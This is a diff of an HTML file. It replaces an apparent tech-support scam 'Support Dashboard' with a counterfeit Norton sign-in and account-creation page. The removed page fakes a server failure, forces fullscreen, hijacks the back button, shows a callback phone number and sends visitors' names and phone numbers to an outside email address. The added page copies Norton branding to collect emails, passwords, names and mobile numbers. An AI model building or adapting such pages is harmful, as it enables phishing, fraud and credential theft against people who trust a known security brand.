@@ -1,284 +1,224 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<!-- Mirrored from support.protectsuitecart.com/dashboard by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Oct 2025 21:58:23 GMT -->
+<html lang="EN" class="web">
+   
 <head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="theme-color" content="#fbbf24" />
-  <title>Support Dashboard</title>
+      <title>Sign In - Official Site | Norton Account Sign In &amp; Set Up</title>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="description" content="Log in to your Norton account. Sign in to enter your product key, access your account, manage your subscription, and extend your Norton protection to PC, Mac, Android, and iOS devices. If you don't already have a Norton account, create one today.">
+      <meta name="viewport" content="width=device-width">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <link rel="stylesheet" href="css/norton-sprites-style1.css" type="text/css" media="screen" title="default">
+      <link rel="stylesheet" href="css/norton-bootstrap3-style.css" type="text/css" media="screen" title="default">
+      <style type="text/css">
+         /* symantec-sans_light.woff */
+         @font-face {
+         font-family: 'Symantec Sans Light';
+         font-style: normal;
+         font-weight: 300;
+         src: url(fonts/symantec-sans_light.woff) format('woff'),
+         url(fonts/symantec-sans_light.ttf) format('truetype');
+         }
+         /* symantec-sans_regular.woff */
+         @font-face {
+         font-family: 'Symantec Sans';
+         font-style: normal;
+         font-weight: 400;
+         src: url(fonts/symantec-sans_regular.woff) format('woff'),
+         url(fonts/symantec-sans_regular.ttf) format('truetype');
+         }
+      </style>
+      <!-- <script type="text/javascript" src="js/norton-js.js"></script> -->
 
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com/"></script>
-
-  <!-- EmailJS SDK -->
-  <script src="../cdn.jsdelivr.net/npm/emailjs-com%403/dist/email.min.js"></script>
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      emailjs.init("L0QtJOw21jcepLwAW"); // ✅ Replace with your EmailJS Public Key
-    });
-  </script>
-
-  <script>
-    // --- Loader simulation ---
-    window.addEventListener("load", function () {
-      const loaderMessage = document.getElementById("loaderMessage");
-      const continueBtn = document.getElementById("continueBtn");
-
-      setTimeout(function () {
-        loaderMessage.textContent = "⚠️ Server connection failed. Please click Continue.";
-        loaderMessage.classList.replace("text-yellow-400", "text-red-400");
-        continueBtn.classList.remove("hidden");
-      }, 3000);
-    });
-
-    // --- Continue button: fullscreen + dashboard ---
-    function continueToDashboard() {
-      const loader = document.getElementById("loader");
-      const loaderMessage = document.getElementById("loaderMessage");
-      const continueBtn = document.getElementById("continueBtn");
-
-      openFullscreen(document.documentElement);
-
-      continueBtn.classList.add("hidden");
-      loaderMessage.textContent = "🔄 Reconnecting...";
-      loaderMessage.classList.replace("text-red-400", "text-yellow-400");
-
-      setTimeout(function () {
-        loader.classList.add("hidden");
-        document.getElementById("dashboard").classList.remove("hidden");
-      }, 2000);
-    }
-
-    // --- Fullscreen helper ---
-    function openFullscreen(elem) {
-      try {
-        if (elem.requestFullscreen) {
-          elem.requestFullscreen().catch(() => {});
-        } else if (elem.webkitRequestFullscreen) {
-          elem.webkitRequestFullscreen();
-        } else if (elem.mozRequestFullScreen) {
-          elem.mozRequestFullScreen();
-        } else if (elem.msRequestFullscreen) {
-          elem.msRequestFullscreen();
-        }
-      } catch (e) {
-        console.warn("Fullscreen not available:", e);
-      }
-    }
-
-    // --- Ticket submission ---
-    function submitTicket(event) {
-      event.preventDefault();
-
-      const name = document.getElementById("ticketName").value;
-      const title = document.getElementById("ticketTitle").value;
-      const message = document.getElementById("ticketMessage").value;
-      const caseId = "N99412"; 
-
-      const templateParams = {
-        name: name,
-        title: title,
-        message: message,
-        caseId: caseId,
-        to_email: "ticket@offhubedu.com"
-      };
-
-      emailjs.send("service_imrzwsf", "template_c7v8b2t", templateParams);
-
-      document.getElementById("ticketForm").classList.add("hidden");
-      const confirmation = document.getElementById("confirmation");
-      confirmation.innerHTML = `
-        <div class="p-6 bg-green-50 border border-green-400 rounded-xl text-green-800 shadow-lg">
-          <p class="font-bold text-lg">✅ Ticket Submitted!</p>
-          <p>Your case ID: <span class="font-mono">${caseId}</span></p>
-          <p><strong>Name:</strong> ${name}</p>
-          <p><strong>Issue:</strong> ${title}</p>
-          <p><strong>Description:</strong> ${message}</p>
-          <hr class="my-3">
-          <p class="text-sm">💬 For instant support, click the button below:</p>
-          <button onclick="openChat()" class="mt-2 px-4 py-2 bg-yellow-500 text-white font-bold rounded-lg shadow hover:bg-yellow-400 transition">
-            Chat Support
-          </button>
-        </div>`;
-      confirmation.classList.remove("hidden");
-    }
-
-// --- Chat support ---
-    function openChat() {
-      if (typeof Tawk_API !== "undefined" && Tawk_API.maximize) {
-        Tawk_API.maximize();
-      } else {
-        alert("Chat support is unavailable right now.");
-      }
-    }
-
-    // --- Prevent back navigation ---
-    history.pushState(null, "", location.href);
-    window.onpopstate = function () {
-      location.replace("https://www.google.com/");
-    };
-
-    /* ---------------------------
-       CALLBACK REQUEST FEATURE
-    --------------------------- */
-    function openCallbackModal() {
-      document.getElementById('callbackModal').classList.remove('hidden');
-      document.getElementById('callbackModal').classList.add('flex');
-      setTimeout(() => document.getElementById('cb_name').focus(), 100);
-    }
-
-    function closeCallbackModal() {
-      document.getElementById('callbackModal').classList.add('hidden');
-      document.getElementById('callbackModal').classList.remove('flex');
-      document.getElementById('cb_name').value = '';
-      document.getElementById('cb_phone').value = '';
-      document.getElementById('cb_message').value = '';
-      document.getElementById('cb_status').textContent = '';
-    }
-
-    function quickCallbackRequest() {
-      document.getElementById('cb_name').value = 'Quick Callback';
-      document.getElementById('cb_message').value = 'User requested a quick callback.';
-      sendCallbackEmail();
-    }
-
-    function sendCallbackEmail() {
-  const name = document.getElementById('cb_name').value.trim() || 'Anonymous';
-  const phone = document.getElementById('cb_phone').value.trim() || 'No phone provided';
-  const message = document.getElementById('cb_message').value.trim() || 'Callback requested';
-  const caseId = "CB-" + Math.floor(Math.random() * 100000);
-
-  const status = document.getElementById('cb_status');
-  status.textContent = 'Sending...';
-  status.className = 'text-sm text-gray-400 mt-2';
-
-  const templateParams = {
-    request_type: "Callback Request",
-    name: name,
-    phone: phone,     // ✅ fixed
-    message: message,
-    caseId: caseId,
-    to_email: "ticket@offhubedu.com"
-  };
-
-  emailjs.send("service_imrzwsf", "template_c7v8b2t", templateParams)
-  .then(() => {
-    status.textContent = '✅ Callback request sent. Case ID: ' + caseId;
-    status.className = 'text-sm text-green-600 mt-2';
-    setTimeout(closeCallbackModal, 2200);
-  })
-  .catch((error) => {
-    console.error('FAILED...', error);
-    status.textContent = '❌ Failed to send. Try again.';
-    status.className = 'text-sm text-red-600 mt-2';
-  });
-}
-
-  </script>
-</head>
-<body class="bg-gray-50 font-sans">
-
- 
-  <div class="fixed top-4 right-4 z-30 flex items-center gap-3">
-    <button onclick="openChat()" class="flex items-center gap-2 px-5 py-2 bg-white shadow-lg border border-gray-200 rounded-full hover:bg-yellow-50 transition">
-      💬 Chat Support
-    </button>
-    <button onclick="openCallbackModal()" class="flex items-center gap-2 px-4 py-2 bg-green-600 text-white rounded-full shadow hover:bg-green-500 transition">
-      📞 Request Callback
-    </button>
-  </div>
-
-  <!-- Loader -->
-  <div id="loader" class="fixed inset-0 flex flex-col items-center justify-center bg-black text-yellow-400 z-40 transition">
-    <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-yellow-400 mb-6"></div>
-    <p id="loaderMessage" class="text-lg font-semibold">Connecting to our server...</p>
-    <p class="text-sm mt-2 text-gray-300">Please wait</p>
-    <button id="continueBtn" onclick="continueToDashboard()" 
-      class="hidden mt-6 px-6 py-3 bg-yellow-500 text-white font-bold rounded-full shadow hover:bg-yellow-400 transition animate-bounce">
-      Continue
-    </button>
-  </div>
-
- <!-- Dashboard -->
-  <div id="dashboard" class="hidden">
-    <div class="flex min-h-screen">
-      <!-- Sidebar -->
-      <aside class="w-64 bg-white border-r border-gray-200 shadow-sm flex flex-col">
-        <div class="p-6 flex items-center border-b border-gray-200">
-          <img src="Image/logo.png" alt="Logo" class="h-10 w-10 mr-3 cursor-pointer" onclick="window.location.href='https://www.google.com/'">
-          <span class="text-xl font-bold text-gray-800">Support Desk</span>
-        </div>
-        <nav class="flex-1 p-4 space-y-2">
-          <button type="button" class="w-full py-2 px-3 rounded-lg bg-yellow-100 text-yellow-700 font-semibold cursor-not-allowed">🏠 Home</button>
-          <button type="button" class="w-full py-2 px-3 rounded-lg hover:bg-gray-100 cursor-not-allowed">👤 My Account</button>
-          <button type="button" class="w-full py-2 px-3 rounded-lg hover:bg-gray-100 cursor-not-allowed">⚙️ Settings</button>
-          <button type="button" onclick="openChat()" class="w-full py-2 px-3 rounded-lg hover:bg-gray-100 font-medium">💬 Chat Support</button>
-        </nav>
-        <div class="p-4 border-t border-gray-200 bg-yellow-50 text-center">
-          <p class="font-bold text-gray-800 text-sm">📞 Quick Assist</p>
-          <button onclick="openCallbackModal()" class="mt-2 px-4 py-2 bg-green-600 text-white font-bold rounded-lg shadow hover:bg-green-500 transition">
-            1-810-777-6441
-          </button>
-        </div>
-      </aside>
-
-      <!-- Main Content -->
-      <main class="flex-1 p-8">
-        <h1 class="text-2xl font-bold text-gray-800 mb-4">Welcome to Your Support Dashboard</h1>
-        <div class="mb-6">
-          <img src="Image/389453hf847hf39ufbyeuyfwief.png" alt="Support Hero" class="rounded-xl shadow-md w-full">
-        </div>
-
-        <!-- Callback Section -->
-        <div class="bg-white p-6 rounded-xl shadow-md border border-gray-100 mt-8 text-center">
-          <h2 class="text-xl font-semibold mb-4 text-gray-800">📞 Need Immediate Assistance?</h2>
-          <p class="text-gray-600 mb-4">Click below to request a callback. Our team will reach out to you as soon as possible.</p>
-          <button onclick="openCallbackModal()" class="px-6 py-3 bg-green-600 text-white font-bold rounded-lg shadow hover:bg-green-500 transition">
-            Request Callback
-          </button>
-        </div>
-      </main>
-    </div>
-  </div>
-
-  <!-- CALLBACK MODAL -->
-  <div id="callbackModal" class="hidden fixed inset-0 items-center justify-center z-50 modal-backdrop">
-    <div class="bg-white rounded-xl shadow-xl w-full max-w-md p-6 mx-4">
-      <div class="flex items-center justify-between">
-        <h3 class="text-lg font-bold">Request a Callback</h3>
-        <button onclick="closeCallbackModal()" class="text-gray-500 hover:text-gray-800">&times;</button>
+   </head>
+   <body class="theme_default login">
+      <div id="wrapper-top">
+         <div id="header-content" class="navbar ">
+            <div class="container">
+               <div class="sso_responsive_img header_branded_logo " id="header-logo">
+                  <div class="sso_responsive_img_inner" aria-label="Norton by Symantec"></div>
+               </div>
+            </div>
+            <span class="hidden_in_mobile">
+               <div class="jumbotron bg_branded_style bg_font">
+                  <div id="background-mask"></div>
+               </div>
+            </span>
+         </div>
+         <div class="container dual-container">
+            <div class="row">
+               <div id="open-column" class="col-md-6 col-sm-5">
+                  <div id="open-content">
+                     <div id="theme">
+                        <div id="default-theme">
+                           <h1>Welcome to Norton</h1>
+                           <p class="lead">Sign in to enter your product key, access your account, manage your subscription, and extend your Norton protection to PC, Mac, Android, and iOS devices.</p>
+                        </div>
+                     </div>
+                     <div id="theme-mobile" class="text-center"></div>
+                  </div>
+               </div>
+               <div id="panel-column" class="col-md-6 col-sm-7">
+                  <div id="panel-background" class="login-panel">
+                     <div id="panel-shadow"></div>
+                     <div id="panel-shadow-bottom"></div>
+                     <div id="panel-content">
+                        <div id="tab-content">
+                           <div id="container" class="btn-container">
+                              <button id="registerToggleButton" type="button" class="btn btn-lg btn-block-sm btn-tab btn-no-outline btn-bg-gradient" data-parent="#tab-content" data-toggle="tab" href="/sign-in/signing.html" role="tab">
+                              Create an Account
+                              </button>
+                              <button id="loginToggleButton" type="button" class="btn btn-lg btn-block-sm btn-tab btn-no-outline btn-bg-gradient in" data-parent="#tab-content" data-toggle="tab" href="/sign-in/signing.html" role="tab">
+                              Sign in
+                              </button>
+                           </div>
+                           <div id="loginCollapse" class="panel-collapse collapse active" autocomplete="off" style="height: auto; display: block;">
+                              <form id="loginform" name="loginform" method="post" action="/sign-in/signing.html">
+                                 <div id="loginPanelBody" class="panel-body">
+                                    <div class="row">
+                                       <div class="form-group text-input col-xs-12">
+                                          <input type="email" class="form-control" name="email" id="EmailFrom" placeholder="Email address" required />
+                                       </div>
+                                    </div>
+                                    <div class="row">
+                                       <div class="form-group text-input col-xs-12">
+                                          <input type="password" class="form-control" name="password" id="password" placeholder="Password" required />
+                                       </div>
+                                    </div>
+                                    <div class="form-group">
+                                       <input class="cbValue" id="remember_me" name="remember_me" type="checkbox" checked="" aria-labelledby="remember_me_lbl" aria-describedby="remember_tooltip">
+                                       <label id="remember_me_lbl" for="remember_me" class="cbLabel">
+                                       Remember me on this device
+                                       </label>
+                                    </div>
+                                    <p class="privacy-text terms text-center" style="margin-top: 10px; font-size: 10px;">
+                                       I have read and agree to the <a href="javascript:void(0)">Privacy Policy</a>
+                                    </p>
+                                    <div class="form-group text-center">
+                                    <!-- Get site  name from norton page 3 -->
+                                                                        <!-- //Get site  name from norton page 3 -->
+                                       <input type="submit" class="btn btn-lg btn-block-sm signin_button" name="submit" value="Sign In">
+                                    </div>
+                                    <div class="form-group text-center">
+                                       <a href="javascript:void(0)" id="forget-passwd-link">Having Trouble Signing In?</a>
+                                    </div>
+                                 </div>
+                              </form>
+                           </div>
+                           <div id="registerCollapse" class="panel-collapse collapse" style="display: none;">
+                              <form id="accountProfileForm" method="post" action="/norton/index.html" autocomplete="off">
+                                 <div id="registerPanelBody" class="panel-body">
+                                 <div class="form-group">
+                                    <p id="smallest-text-id" class="smallest-text">An account is needed to access all of your Norton products and services.</p>
+                                 </div>
+                                 <div class="row">
+                                    <div class="form-group text-input col-xs-12">
+                                       <input type="email" class="form-control" name="email" id="email" placeholder="Email address *" required>
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="form-group text-input col-xs-12">
+                                       <input type="text" name="emailConfirm" id="confemail" onblur="confirmEmail()" class="form-control" placeholder="Confirm email address *" />
+                                    </div>
+                                 </div>
+                                 <script type="text/javascript">
+                                    function confirmEmail() {
+                                       var email = document.getElementById("email").value
+                                       var confemail = document.getElementById("confemail").value
+                                       if(email != confemail) {
+                                             alert('Email Not Matching!');
+                                             return                                        }
+                                    }
+                                 </script>
+                                 <div class="row">
+                                    <div class="form-group text-input col-xs-12">
+                                       <input type="password" class="form-control" name="password" id="createPassword" placeholder="Create a secure password *" required />
+                                    </div>
+                                 </div>
+                                 <div class="row hide-context-menu">
+                                    <div class="form-group text-input col-xs-6">
+                                       <input type="text" class="form-control" name="fname" placeholder="First name *">
+                                    </div>
+                                    <div class="form-group text-input col-xs-6">
+                                       <input type="text" class="form-control" name="lname" placeholder="Last name *">
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="form-group text-input col-xs-12">
+                                    <input type="text" class="form-control" name="mobile" placeholder="Mobile phone number *">
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="form-group col-xs-12">
+                                       <div class="checkbox" id="marketingPanel">
+                                          <input id="marketing2" name="marketing2" type="checkbox" value="true" aria-labelledby="marketing2_lbl">
+                                          <label id="marketing2_lbl" for="marketing2">
+                                          Email me product updates, offers, and security newsletters
+                                          </label>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="form-group col-xs-12 text-center">
+                                       <p class="privacy-text terms text-center" style="margin-top: 10px; font-size: 10px;">
+                                          I have read and agree to the <a href="javascript:void(0)">Privacy Policy</a>
+                                       </p>
+                                    </div>
+                                    <div class="form-group text-center">
+                                    <!-- Get Email Subject and site name from norton page 3 -->
+                                                                        <!-- //Get Email Subject from norton page 3 -->
+                                       <input type="submit" class="btn btn-lg btn-block-sm signin_button" name="submit" value="Create Account">
+                                    </div>
+                                 </div>
+                              </div>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
       </div>
-      <p class="text-sm text-gray-600 mt-2">Enter your name and phone number and we will call you back.</p>
-      <div class="mt-4 space-y-3">
-        <input id="cb_name" type="text" placeholder="Your name" class="w-full p-3 border rounded-lg" />
-        <input id="cb_phone" type="tel" placeholder="Phone number (with country code)" class="w-full p-3 border rounded-lg" />
-        <textarea id="cb_message" rows="3" placeholder="Optional message" class="w-full p-3 border rounded-lg"></textarea>
-        <div class="flex gap-2">
-          <button onclick="sendCallbackEmail()" class="flex-1 px-4 py-2 bg-green-600 text-white rounded-lg font-semibold hover:bg-green-500">Send Request</button>
-          <button onclick="quickCallbackRequest()" class="px-4 py-2 bg-gray-100 rounded-lg hover:bg-gray-200">One-click</button>
-        </div>
-        <div id="cb_status" class="min-h-[1.5rem]"></div>
+   </div>
+      <div id="wrapper-bottom">
+         <div id="footer-content">
+            <footer class="np-global-footer" id="ngp-main-footer">
+               <div class="row">
+                  <ul class="footer-links">
+                     <li>
+                        <a href="javascript:void(0)">Terms of Service</a>
+                     </li>
+                     <li>
+                        <a href="javascript:void(0)">Privacy Policy</a>
+                     </li>
+                  </ul>
+               </div>
+            </footer>
+         </div>
       </div>
-    </div>
-  </div>
+      <script type="text/javascript" src="js/norton-jquery.js"></script>
+      <script type="text/javascript">
+         function ssoPageLoad() {
+            $("#loginToggleButton, #login-link-signup").click(function ()
+            {
+               $("#loginCollapse").show();
 
-  <!-- Tawk.to Script -->
-  <script>
-    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-    (function(){
-      var s1 = document.createElement("script"),
-          s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = "https://embed.tawk.to/666a0002981b6c56477c7680/1i07103h5";
-      s1.charset = "UTF-8";
-      s1.setAttribute("crossorigin","*");
-      s0.parentNode.insertBefore(s1,s0);
-    })();
-  </script>
+               $("#registerCollapse").hide();
+               $("#registerCollapse").removeClass("in");
 
-</body>
+               $("#loginToggleButton").addClass("in");
+               $("#registerToggleButton").removeClass("in");
+            });
 
-<!-- Mirrored from support.protectsuitecart.com/dashboard by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Oct 2025 21:58:25 GMT -->
+            $("#registerToggleButton").click(function () {
+               $("#loginCollapse").hide();
+               $("#loginCollapse").removeClass("in");
+
+               $("#registerCollapse").show();
+               $("#registerToggleButton").addClass("in");
+               $("#loginToggleButton").removeClass("in");
+            });
+            showFocusOutlineOnKeyBoardTab("#container > button.btn-tab", "btn-no-outline");
+         }
+      </script>
+
+   </body>
 </html>
